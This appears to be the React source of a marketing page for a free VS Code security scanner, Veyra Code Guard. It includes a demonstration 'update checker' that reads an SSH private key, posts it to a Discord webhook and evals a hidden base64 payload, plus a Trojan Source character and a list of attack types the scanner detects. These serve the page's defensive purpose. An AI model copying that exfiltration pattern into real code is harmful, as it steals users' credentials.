// veyra-guard-ignore-file: this page shows a sample malicious script on purpose, to demonstrate Code Guard.
import type {Metadata} from 'next';
import Image from 'next/image';
import {Bug,Check,Cpu,Download,EyeOff,FileText,GitCommitHorizontal,GitPullRequest,KeyRound,Lock,Minus,PackageX,ShieldAlert,ShieldCheck,Skull,Terminal,Workflow,X,Zap} from 'lucide-react';
import {Nav} from '@/components/Nav';
import {Footer} from '@/components/Footer';
import {MoreExtensions} from '@/components/MoreExtensions';
import {Breadcrumbs} from '@/components/Breadcrumbs';
import {ClosingCTA} from '@/components/ContentPage';
import {absolute,jsonLd,marketplaceUrl,VSCODE_EXTENSIONS,vsixUrl} from '@/lib/site';
import '../live-server/live-server.css';
import './code-guard.css';

const EXT=VSCODE_EXTENSIONS.codeGuard;
const MARKETPLACE=marketplaceUrl(EXT.id), VSIX=vsixUrl(EXT);

export const metadata:Metadata={
  title:'Veyra Code Guard: Find Trojans, Backdoors and Supply-Chain Attacks',
  description:'A free security reviewer for VS Code, git and GitHub. Checks every line, in any language, for trojans, backdoors, web shells, ransomware, typo-squatted packages and leaked keys, rescans as soon as you remove them, explains how to fix each one, grades your project A to F and creates a PDF security report.',
  keywords:['malicious code detection','trojan source','backdoor','web shell detection','ransomware detection','keylogger','supply chain security','typosquatting','dependency confusion','security code review','PDF security report','pre-commit hook','GitHub Action','SARIF','VS Code security extension'],
  alternates:{canonical:'/code-guard'},
  openGraph:{url:'/code-guard',title:'Veyra Code Guard',description:'Every line checked for trojans and backdoors, with a fix for each and a PDF security report. Free for VS Code and GitHub.',images:[{url:'/code-guard-panel.webp',width:1400,height:860,alt:'The Code Guard panel in VS Code with a project graded F and its findings grouped by severity'}]},
};

const SCAN=[
  {code:'const https = require("https");'},
  {code:'const fs = require("fs");'},
  {code:''},
  {code:'// Checks for a newer version of the CLI.',dim:true},
  {code:'function checkForUpdates() {'},
  {code:'  const key = fs.readFileSync(home + "/.ssh/id_rsa");',sev:'high',label:'Reads your SSH key'},
  {code:'  https.request("discord.com/api/webhooks/…").end(key);',sev:'high',label:'Sends it to a webhook'},
  {code:'  eval(atob(process.env.UPDATE_PAYLOAD));',sev:'critical',label:'Runs a hidden payload'},
  {code:'}'},
  {code:'const channel = "stable⟨U+202E⟩";',sev:'critical',label:'Trojan Source character'},
];
const PLACES=[
  {icon:ShieldCheck,title:'In your editor',copy:'Every file checked as you type, and rescanned the moment you remove malicious code, with a panel, a grade and quick fixes.'},
  {icon:GitCommitHorizontal,title:'Before every commit',copy:'A pre-commit guard stops risky code before it leaves your machine.'},
  {icon:GitPullRequest,title:'On every pull request',copy:'Line comments, a grade and a failing check on GitHub.'},
  {icon:FileText,title:'In a PDF report',copy:'An audit-ready security report with every finding and its fix.'},
];
const CATCHES=[
  {icon:EyeOff,title:'Hidden in plain sight',copy:'Trojan Source characters, invisible characters, look-alike letters, code pushed off-screen and text spelled out in character codes.',n:7},
  {icon:Bug,title:'Hidden code being run',copy:'eval of decoded strings in PHP, Ruby, Perl, Lua, .NET and more, packed JavaScript, encoded PowerShell, and code downloaded at run time.',n:6},
  {icon:Terminal,title:'Backdoors',copy:'Web shells, reverse shells, download-and-run commands, crypto miners, persistence, backdoor logins and disabled defences.',n:8},
  {icon:Skull,title:'Ransomware, wipers and spyware',copy:'Deleted backups and ransom notes, rm -rf / and disk wipers, keyloggers and clipboard crypto hijackers.',n:4},
  {icon:Cpu,title:'Native and macro malware',copy:'Shellcode, process injection, executable memory, Office macro droppers and databases running commands.',n:5},
  {icon:KeyRound,title:'Stolen and leaked secrets',copy:'Code that reads SSH keys, wallets or browser passwords, sends data to webhooks, or commits API keys by mistake.',n:6},
  {icon:PackageX,title:'Supply-chain attacks',copy:'Typo-squatted packages, dependency confusion, poisoned install scripts, setup.py and build.rs code, URL and unpinned dependencies.',n:7},
  {icon:Workflow,title:'CI and workflow attacks',copy:'Untrusted text in GitHub workflows and pull_request_target jobs that run outsiders’ code.',n:2},
];
const COMPARE:Array<[string,boolean|'partly',boolean|'partly',boolean]>=[
  ['Leaked API keys','partly',true,true],
  ['Trojan Source and invisible characters','partly',false,true],
  ['Obfuscated code being run',false,false,true],
  ['Reverse shells, miners, persistence',false,false,true],
  ['Web shells, ransomware and keyloggers in any language',false,false,true],
  ['Rescans as soon as malicious code is removed','partly',false,true],
  ['Typo-squatted packages',false,false,true],
  ['Explains how to fix every finding','partly','partly',true],
  ['Grade and PDF security report',false,false,true],
  ['Editor, pre-commit and pull request in one',false,'partly',true],
];
const FAQ=[
  {q:'Is it free?',a:'Yes. Veyra Code Guard is free and MIT licensed, with no account and no telemetry, in VS Code, in git and on GitHub.'},
  {q:'What is in the PDF report?',a:'A cover with the grade, score and top risks; every finding with its location, the code around it, why it matters and how to fix it; and the method and rules used. It is ready to share with a client, a manager or an auditor.'},
  {q:'How does the pre-commit guard work?',a:'Run Install Pre-commit Guard once. Every git commit then checks only the lines you are committing and stops the commit if they add a high or critical finding. Skip it once with git commit --no-verify.'},
  {q:'How do I add it to GitHub?',a:'Add a workflow with actions/checkout and fcopensource/veyraeditor/extensions/code-guard. It reviews every pull request, and can also write the PDF report and send findings to the Security tab.'},
  {q:'Which languages does it check?',a:'All of them. Every text file is read line by line, and the rules cover the tricks used in JavaScript, TypeScript, Python, PHP, Java, C#, C and C++, Go, Rust, Ruby, Perl, Lua, PowerShell, shell scripts, batch files, SQL, VBA macros, Dockerfiles, GitHub workflows and package manifests. 77 languages are recognised by name and listed in the report.'},
  {q:'What happens when I remove the malicious code?',a:'The file is rescanned straight away and the warning disappears with the code. Every quick fix (delete the line, remove hidden characters) rescans and tells you what is left, and files changed by git or another program are rechecked too. On the command line, --watch does the same.'},
  {q:'Can I add our own rules?',a:'Yes. Put your patterns, ignored paths and severities in a .veyra-guard.json file in your project. VS Code, the command line, the pre-commit guard and the GitHub Action all use it.'},
  {q:'Does it upload my code?',a:'No. Everything runs on your computer, or on your own GitHub Actions runner.'},
  {q:'Can it catch every attack?',a:'No tool can. Code Guard recognises the patterns attackers use; use it alongside careful review and dependency audits, not instead of them.'},
];
const WORKFLOW=`name: Veyra Code Guard
on: pull_request
permissions:
  contents: read
  pull-requests: write
jobs:
  code-guard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: fcopensource/veyraeditor/extensions/code-guard@main
        with:
          report-pdf: code-guard-report.pdf`;

const Mark=({v}:{v:boolean|'partly'})=>v===true?<Check className="cg-yes" aria-label="Yes"/>:v==='partly'?<Minus className="cg-part" aria-label="Partly"/>:<X className="cg-no" aria-label="No"/>;

export default function CodeGuardPage(){
  const app={
    '@context':'https://schema.org','@type':'SoftwareApplication',name:'Veyra Code Guard',applicationCategory:'SecurityApplication',
    operatingSystem:'Windows, macOS, Linux',url:absolute('/code-guard'),image:absolute('/code-guard-icon.png'),softwareVersion:EXT.version,downloadUrl:EXT.listed?MARKETPLACE:VSIX,
    description:'A free security reviewer for VS Code, git and GitHub that checks every line of code for trojans, backdoors and supply-chain attacks and creates a PDF security report.',
    offers:{'@type':'Offer',price:'0',priceCurrency:'USD'},publisher:{'@type':'Organization',name:'Veyra',url:absolute('/')},
  };
  const faq={'@context':'https://schema.org','@type':'FAQPage',mainEntity:FAQ.map(item=>({'@type':'Question',name:item.q,acceptedAnswer:{'@type':'Answer',text:item.a}}))};

  return <><Nav/><Breadcrumbs items={[{name:'Extensions',path:'/extensions'},{name:'Veyra Code Guard',path:'/code-guard'}]}/>
    <script type="application/ld+json" dangerouslySetInnerHTML={{__html:jsonLd(app)}}/>
    <script type="application/ld+json" dangerouslySetInnerHTML={{__html:jsonLd(faq)}}/>
    <main className="page-shell cg-page"><div className="content live-page">

      <section className="cg-hero">
        <div className="cg-hero-grid" aria-hidden="true"/>
        <div className="cg-shield" aria-hidden="true">
          <Image src="/code-guard-icon.png" width={132} height={132} alt="" priority/>
          <span className="cg-scanline"/>
        </div>
        <span className="cg-kicker"><i/>NEW IN 1.2 · ANY LANGUAGE · RESCANS AS YOU FIX · TEAM RULES</span>
        <h1>Every line. Every commit.<br/><em>Every pull request.</em></h1>
        <p className="cg-lede">Veyra Code Guard reads your code the way an attacker writes it, in any language. It catches trojans, backdoors, web shells, ransomware, typo-squatted packages and leaked keys, tells you exactly how to fix each one, rescans the moment you remove them, and writes the security report for you.</p>
        <div className="live-actions">
          {EXT.listed?<a className="primary" href={MARKETPLACE}><Zap size={16}/>Get it for VS Code</a>:<a className="primary" href={VSIX}><Download size={16}/>Download for VS Code</a>}
          <a className="secondary" href="#github"><GitPullRequest size={16}/>Add to GitHub</a>
        </div>
        <p className="live-micro">{EXT.id} · v{EXT.version} · Free · MIT · Windows, macOS, Linux</p>
        <div className="cg-stats">
          <div><b>45</b><span>attack patterns</span></div>
          <div><b>77</b><span>languages recognised</span></div>
          <div><b>&lt;3s</b><span>to check 808 files</span></div>
          <div><b>0</b><span>bytes uploaded</span></div>
        </div>
      </section>

      <section className="cg-scan" aria-label="Code Guard scanning a malicious script">
        <div className="cg-window">
          <div className="live-bar"><span/><span/><span/><b>update-check.js</b><em className="cg-grade">Grade F</em></div>
          <ol>{SCAN.map((l,i)=><li key={i} className={l.sev?`hit ${l.sev}`:''} style={{['--i' as string]:i} as React.CSSProperties}>
            <code className={l.dim?'dim':''}>{l.code||' '}</code>
            {l.sev&&<span className={`cg-tag ${l.sev}`}>{l.sev==='critical'?<ShieldAlert size={13}/>:<KeyRound size={13}/>}{l.label}</span>}
          </li>)}</ol>
        </div>
        <p className="cg-caption">A script that calls itself an “update checker”. Code Guard flags four lines in it, and explains each one.</p>
      </section>

      <section className="content-section">
        <header><span>FOUR LINES OF DEFENCE</span><h2>Protection wherever code moves.</h2></header>
        <div className="cg-places">{PLACES.map((p,i)=><article key={p.title}><span className="cg-step">{String(i+1).padStart(2,'0')}</span><p.icon/><h3>{p.title}</h3><p>{p.copy}</p></article>)}</div>
      </section>

      <section className="cg-report">
        <div className="cg-report-copy">
          <span className="kicker">PDF SECURITY REPORT</span>
          <h2>The report writes itself.</h2>
          <p>One click turns a scan into a professional security report: ready for a client hand-over, a manager or an audit.</p>
          <ul>
            <li><Check/>A grade from A to F and a score out of 100</li>
            <li><Check/>Findings by severity and the top risks, at a glance</li>
            <li><Check/>The code around every finding, with the line highlighted</li>
            <li><Check/>Why it matters and how to fix it, for every finding</li>
            <li><Check/>The method and every rule checked</li>
          </ul>
        </div>
        <div className="cg-pages">
          <img className="back" src="/code-guard-report-2.webp" alt="A findings page of the report with code excerpts and how-to-fix guidance" width={900} height={1273} loading="lazy"/>
          <img className="front" src="/code-guard-report-1.webp" alt="The cover of a Code Guard security report with grade F, severity counts and the top risks" width={900} height={1273} loading="lazy"/>
        </div>
      </section>

      <section className="content-section">
        <header><span>IN VS CODE</span><h2>A security panel that never sleeps.</h2></header>
        <div className="cg-shots">
          <figure><img src="/code-guard-panel.webp" alt="The Code Guard panel showing Grade F with findings grouped by severity" width={1400} height={860} loading="lazy"/><figcaption>The Code Guard panel: the grade, every finding by severity, one click to jump to it.</figcaption></figure>
          <figure><img src="/code-guard-hover.webp" alt="A hover on a flagged line explaining why it matters and how to fix it" width={1400} height={860} loading="lazy"/><figcaption>Hover any flagged line for what was found, why it matters and how to fix it.</figcaption></figure>
        </div>
      </section>

      <section className="content-section split" id="github">
        <div>
          <span className="kicker">ON GITHUB</span>
          <h2>A reviewer on every pull request.</h2>
          <p className="cg-body">Code Guard reads each line a pull request adds, comments on the exact lines, posts a grade and fails the check when it’s serious. It can also write the PDF report and send findings to your repository’s Security tab.</p>
          <div className="pm-terminal cg-code"><div className="live-bar"><span/><span/><span/><b>.github/workflows/code-guard.yml</b></div><pre>{WORKFLOW}</pre></div>
        </div>
        <div className="cg-pr" aria-label="A Code Guard review comment on a pull request">
          <div className="cg-pr-head"><Image src="/code-guard-icon.png" width={28} height={28} alt=""/><b>veyra-code-guard</b><span>requested changes</span></div>
          <div className="cg-pr-diff"><span className="ln">42</span><code><b>+</b>  eval(atob(process.env.UPDATE_PAYLOAD));</code></div>
          <div className="cg-pr-body">
            <p><strong>🛑 Running decoded or obfuscated code</strong> (critical)</p>
            <p>Decoding a hidden string and then executing it is the classic way malware hides its real behaviour from reviewers and scanners.</p>
            <p><strong>How to fix:</strong> decode the string and read what it really does. Replace eval with ordinary code.</p>
          </div>
          <div className="cg-pr-check"><X size={16}/><b>Veyra Code Guard</b><span>Grade D (70/100) · 1 critical</span></div>
        </div>
      </section>

      <section className="content-section split">
        <div className="pm-terminal cg-term" aria-label="A blocked git commit">
          <div className="live-bar"><span/><span/><span/><b>Terminal</b></div>
          <pre><span className="d">$</span> git commit -m "Add update checker"{'\n\n'}<span className="g">Veyra Code Guard</span>  Staged changes · 1 file{'\n\n'}  <span className="r">CRITICAL</span> <b>Running decoded or obfuscated code</b>  <span className="d">src/update.js:9:3</span>{'\n'}           Decodes and runs hidden code: eval(atob{'\n'}           <span className="g">Fix:</span> Decode the string and read what it really does.{'\n\n'}  <span className="r">Commit blocked.</span> Fix the line above, or mark it as reviewed.{'\n'}  To skip the check once: git commit --no-verify</pre>
        </div>
        <div>
          <span className="kicker">PRE-COMMIT GUARD</span>
          <h2>Stopped before it’s committed.</h2>
          <p className="cg-body">Install the guard once with one command. Every commit, from VS Code, a terminal or any git app, is checked first. Only the lines you’re committing are read, so it’s instant, and it works alongside the hooks you already have.</p>
        </div>
      </section>

      <section className="content-section">
        <header><span>WHAT IT CATCHES</span><h2>45 tricks attackers actually use.</h2></header>
        <div className="cards">{CATCHES.map(c=><article className="card cg-catch" key={c.title}><c.icon/><h3>{c.title}<small>{c.n} rules</small></h3><p>{c.copy}</p></article>)}</div>
      </section>

      <section className="content-section">
        <header><span>WHY CODE GUARD</span><h2>Made for what others miss.</h2></header>
        <div className="cg-compare" role="table">
          <div className="row head" role="row"><span role="columnheader"/><span role="columnheader">Typical linter</span><span role="columnheader">Secret scanner</span><span role="columnheader" className="us">Code Guard</span></div>
          {COMPARE.map(([what,a,b,c])=><div className="row" role="row" key={what}><span role="cell">{what}</span><span role="cell"><Mark v={a}/></span><span role="cell"><Mark v={b}/></span><span role="cell" className="us"><Mark v={c}/></span></div>)}
        </div>
        <p className="cg-note"><Lock size={14}/>Code Guard runs entirely on your computer or your own CI. Your code is never uploaded anywhere.</p>
      </section>

      <section className="content-section split" id="install">
        <div>
          <span className="kicker">INSTALL</span>
          <h2>Ready in a minute.</h2>
          {EXT.listed?<ol className="live-install">
            <li>In VS Code, open <strong>Extensions</strong> (<kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>X</kbd>) and search for <strong>Veyra Code Guard</strong>, or open it on the <a href={MARKETPLACE}>Visual Studio Marketplace</a>.</li>
            <li>Click the shield in the Activity Bar and press <strong>Scan Whole Workspace</strong>.</li>
          </ol>:<ol className="live-install">
            <li><a href={VSIX}>Download the <code>.vsix</code></a> (97 KB).</li>
            <li>In VS Code, press <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>P</kbd> and run <strong>Extensions: Install from VSIX…</strong>, then choose the file.</li>
            <li>Click the shield in the Activity Bar and press <strong>Scan Whole Workspace</strong>.</li>
          </ol>}
          <p className="live-note">Then try <strong>Create Security Report (PDF)</strong> and <strong>Install Pre-commit Guard</strong> from the same panel. {EXT.listed?'':'Coming to the Visual Studio Marketplace soon.'}</p>
        </div>
        <div className="visual" aria-label="Grades">
          <small>The grade</small>
          <b>A</b> <i>clean</i><br/>
          <b>B · C</b> <i>things to review</i><br/>
          <b>D</b> <i>a critical finding</i><br/>
          <b>F</b> <i>act now</i>
        </div>
      </section>

      <section className="content-section">
        <header><span>FAQ</span><h2>Questions</h2></header>
        <div className="live-faq">{FAQ.map(item=><details key={item.q}><summary>{item.q}</summary><p>{item.a}</p></details>)}</div>
        <MoreExtensions current="/code-guard"/>
      </section>

      <ClosingCTA title="Made by the Veyra team." copy="Veyra Studio is a fast, free code editor with Live Server, Python debugging and Veyra AI built in."/>
    </div></main><Footer/></>;
}
